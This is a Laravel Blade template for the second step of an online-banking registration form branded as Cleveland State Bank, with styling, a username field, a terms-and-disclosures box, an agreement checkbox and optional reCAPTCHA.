<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Step 2: Terms & Disclosures | Cleveland State Bank</title>

<link rel="apple-touch-icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}">
<link rel="icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" type="image/x-icon">

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    min-height: 100vh;
    background-color: #edf0f4;
    background-image: url("{{ asset('assets/institutions/clevelandstatebank/images/csb-bg-ribbons.svg') }}");
    background-size: cover;
    background-position: center center;
    background-repeat: no-repeat;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 30px 16px;
    position: relative;
}

.csb-modal-card {
    width: 100%;
    max-width: 720px;
    background: #ffffff;
    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.25);
    border-radius: 2px;
    overflow: hidden;
}

.modal-header-red {
    background-color: #c8232c;
    height: 44px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 16px;
    position: relative;
}

.header-back-btn {
    color: #ffffff;
    font-size: 20px;
    font-weight: bold;
    cursor: pointer;
    background: none;
    border: none;
    line-height: 1;
    padding: 4px;
    text-decoration: none;
}

.modal-header-title {
    color: #ffffff;
    font-size: 13.5px;
    font-weight: bold;
    letter-spacing: 0.8px;
    text-transform: uppercase;
    font-family: Arial, Helvetica, sans-serif;
    position: absolute;
    left: 50%;
    transform: translateX(-50%);
}

.modal-close-btn {
    color: #ffffff;
    font-size: 18px;
    font-weight: bold;
    text-decoration: none;
    line-height: 1;
    cursor: pointer;
    margin-left: auto;
}

.modal-close-btn:hover,
.header-back-btn:hover {
    opacity: 0.8;
}

.modal-body {
    padding: 32px 36px 36px;
}

.section-heading {
    font-size: 13px;
    font-weight: bold;
    color: #4a5568;
    letter-spacing: 0.5px;
    text-transform: uppercase;
    padding-bottom: 6px;
    border-bottom: 1px solid #cbd5e0;
    margin-bottom: 16px;
    margin-top: 10px;
    font-family: Arial, Helvetica, sans-serif;
}

.csb-field-box {
    position: relative;
    border: 1px solid #b0bec5;
    background: #ffffff;
    border-radius: 2px;
    margin-bottom: 12px;
    transition: border-color 0.15s;
}

.csb-field-box.has-error {
    border: 1.5px solid #c8232c !important;
    background-color: #fff9f9;
}

.required-tag {
    position: absolute;
    top: 3px;
    right: 6px;
    font-size: 10.5px;
    color: #78909c;
    pointer-events: none;
    font-style: italic;
}

.csb-field-box input,
.csb-field-box select {
    width: 100%;
    height: 48px;
    border: none;
    outline: none;
    padding: 10px 12px;
    font-size: 13px;
    font-weight: bold;
    color: #333333;
    letter-spacing: 0.5px;
    background: transparent;
}

.csb-field-box input::placeholder {
    color: #78909c;
    font-weight: bold;
    letter-spacing: 0.6px;
}

.csb-field-error-msg {
    color: #c8232c;
    font-size: 11px;
    font-weight: bold;
    margin-top: -8px;
    margin-bottom: 10px;
    text-align: left;
    display: block;
}

/* Disclosure Scroll Box */
.disclosure-box {
    background-color: #f8fafc;
    border: 1px solid #cbd5e0;
    padding: 16px;
    font-size: 12px;
    line-height: 1.55;
    color: #475569;
    max-height: 160px;
    overflow-y: auto;
    border-radius: 2px;
    margin-bottom: 16px;
}

.disclosure-box h4 {
    color: #1e293b;
    font-size: 12.5px;
    margin-bottom: 6px;
    text-transform: uppercase;
}

.csb-agreement-check {
    display: flex;
    align-items: flex-start;
    gap: 10px;
    margin: 16px 0;
    cursor: pointer;
    text-align: left;
}

.csb-agreement-check input[type="checkbox"] {
    width: 18px;
    height: 18px;
    margin-top: 2px;
    accent-color: #1e355b;
    cursor: pointer;
}

.csb-agreement-check span {
    font-size: 12.5px;
    color: #334155;
    line-height: 1.45;
}

.bottom-actions-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 24px;
    padding-top: 16px;
    border-top: 1px solid #e2e8f0;
}

.step-indicator-pill {
    background-color: #e2e8f0;
    color: #4a5568;
    font-size: 12px;
    font-weight: bold;
    padding: 8px 18px;
    border-radius: 2px;
    letter-spacing: 0.5px;
    text-transform: uppercase;
}

.btn-continue-submit {
    background-color: #68b828;
    color: #ffffff;
    border: none;
    border-radius: 2px;
    font-size: 13px;
    font-weight: bold;
    letter-spacing: 0.8px;
    padding: 10px 24px;
    cursor: pointer;
    text-transform: uppercase;
    display: inline-flex;
    align-items: center;
    gap: 6px;
    transition: background-color 0.2s;
}

.btn-continue-submit:hover {
    background-color: #559e1d;
}

/* Error Banner Modal */
.csb-error-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: rgba(0, 0, 0, 0.45);
    z-index: 9999;
    display: flex;
    align-items: center;
    justify-content: center;
}

.csb-error-banner {
    width: 100%;
    background-color: #262626;
    color: #ffffff;
    padding: 32px 20px;
    text-align: center;
    box-shadow: 0 8px 30px rgba(0,0,0,0.6);
}

.csb-error-title {
    font-size: 14px;
    font-weight: bold;
    color: #e0e0e0;
    letter-spacing: 0.8px;
    margin-bottom: 12px;
    text-transform: uppercase;
}

.csb-error-desc {
    font-size: 13.5px;
    line-height: 1.5;
    color: #ffffff;
    max-width: 600px;
    margin: 0 auto 16px;
}

.csb-error-btn {
    background-color: #d9534f;
    border: none;
    color: #ffffff;
    font-size: 13px;
    font-weight: bold;
    padding: 8px 36px;
    border-radius: 2px;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}
</style>
</head>
<body>

    <div class="csb-modal-card">
        <div class="modal-header-red">
            <a href="{{ route('register') }}" class="header-back-btn" title="Back">&lsaquo;</a>
            <span class="modal-header-title">DISCLOSURES & AGREEMENT</span>
            <a href="{{ route('login') }}" class="modal-close-btn" title="Close">&#10005;</a>
        </div>

        <div class="modal-body">
            <form method="POST" action="{{ route('register.now.step2') }}" id="csbStep2Form">
                @csrf

                {{-- Hidden Carry-Forwards from Step 1 --}}
                <input type="hidden" name="first_name" value="{{ $step1['first_name'] ?? old('first_name', '') }}">
                <input type="hidden" name="middle_name" value="{{ $step1['middle_name'] ?? old('middle_name', '') }}">
                <input type="hidden" name="last_name" value="{{ $step1['last_name'] ?? old('last_name', '') }}">
                <input type="hidden" name="address" value="{{ $step1['address'] ?? old('address', '') }}">
                <input type="hidden" name="address_line_2" value="{{ $step1['address_line_2'] ?? old('address_line_2', '') }}">
                <input type="hidden" name="city" value="{{ $step1['city'] ?? old('city', '') }}">
                <input type="hidden" name="state" value="{{ $step1['state'] ?? old('state', '') }}">
                <input type="hidden" name="zip_code" value="{{ $step1['zip_code'] ?? old('zip_code', '') }}">

                <!-- Online Access Credentials -->
                <div class="section-heading">ONLINE ACCESS CREDENTIALS</div>

                <div class="csb-field-box @error('username') has-error @enderror">
                    <span class="required-tag">required</span>
                    @php
                        $suggestedUser = strtolower(($step1['first_name'] ?? 'member') . ($step1['last_name'] ?? ''));
                        $suggestedUser = preg_replace('/[^a-zA-Z0-9_]/', '', $suggestedUser);
                    @endphp
                    <input 
                        type="text" 
                        name="username" 
                        id="username_field" 
                        value="{{ old('username', $suggestedUser) }}" 
                        placeholder="CHOOSE A USERNAME" 
                        required 
                        autofocus
                    >
                </div>
                @error('username')
                    <span class="csb-field-error-msg">{{ $message }}</span>
                @enderror

                @if(getPageSetting('gender_show'))
                <div class="csb-field-box">
                    <select name="gender">
                        <option value="Male" @selected(old('gender') == 'Male')>Male</option>
                        <option value="Female" @selected(old('gender') == 'Female')>Female</option>
                        <option value="Others" @selected(old('gender') == 'Others')>Others</option>
                    </select>
                </div>
                @endif

                @if(getPageSetting('branch_show') && branch_enabled() && isset($branches) && count($branches) > 0)
                <div class="csb-field-box">
                    <select name="branch_id">
                        <option value="" disabled selected>Select Branch</option>
                        @foreach($branches as $b)
                            <option value="{{ $b->id }}" @selected(old('branch_id') == $b->id)>{{ $b->name }}</option>
                        @endforeach
                    </select>
                </div>
                @endif

                <!-- Disclosures & Terms -->
                <div class="section-heading">TERMS & DISCLOSURES</div>

                <div class="disclosure-box">
                    <h4>Cleveland State Bank Electronic Consent & Online Banking Agreement</h4>
                    <p>
                        This Electronic Record and Signature Disclosure governs your use of Cleveland State Bank Online Banking services. By enrolling, you consent to receive electronic communications, account statements, fee notices, and disclosure documents electronically. You confirm that your computer or mobile device satisfies hardware and software requirements to view and retain these notices.
                    </p>
                    <p style="margin-top: 8px;">
                        You certify that all personal and contact information provided during self-registration is accurate, complete, and verifiable. Fraudulent attempts to open or access accounts are subject to federal and state prosecution under applicable banking laws.
                    </p>
                </div>

                <label class="csb-agreement-check">
                    <input type="checkbox" name="i_agree" value="yes" required @checked(old('i_agree'))>
                    <span>I have read and agree to the <strong>Cleveland State Bank Online Banking Agreement</strong>, Electronic Communications Disclosure, and Account Terms & Conditions.</span>
                </label>
                @error('i_agree')
                    <span class="csb-field-error-msg">{{ $message }}</span>
                @enderror

                @if($googleReCaptcha)
                <div style="margin: 16px 0; display: flex; justify-content: center;">
                    <div class="g-recaptcha" data-sitekey="{{ json_decode($googleReCaptcha->data, true)['site_key'] }}"></div>
                </div>
                @endif

                <div class="bottom-actions-row">
                    <div class="step-indicator-pill">STEP 2 OF 3</div>
                    <button type="submit" class="btn-continue-submit">ACCEPT & COMPLETE &rarr;</button>
                </div>
            </form>
        </div>
    </div>

    @if ($errors->any() || session('error'))
    <div class="csb-error-overlay" id="errorOverlay">
        <div class="csb-error-banner">
            <div class="csb-error-title">AN ERROR HAS OCCURRED</div>
            <div class="csb-error-desc">
                {{ session('error') ?? ($errors->first() ?: 'The information you entered could not be properly validated. Please double check your information and if you feel it is correct please contact your financial institution for further help.') }}
            </div>
            <button type="button" class="csb-error-btn" onclick="document.getElementById('errorOverlay').style.display='none'">OK</button>
        </div>
    </div>
    @endif

    @if($googleReCaptcha)
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    @endif
</body>
</html>
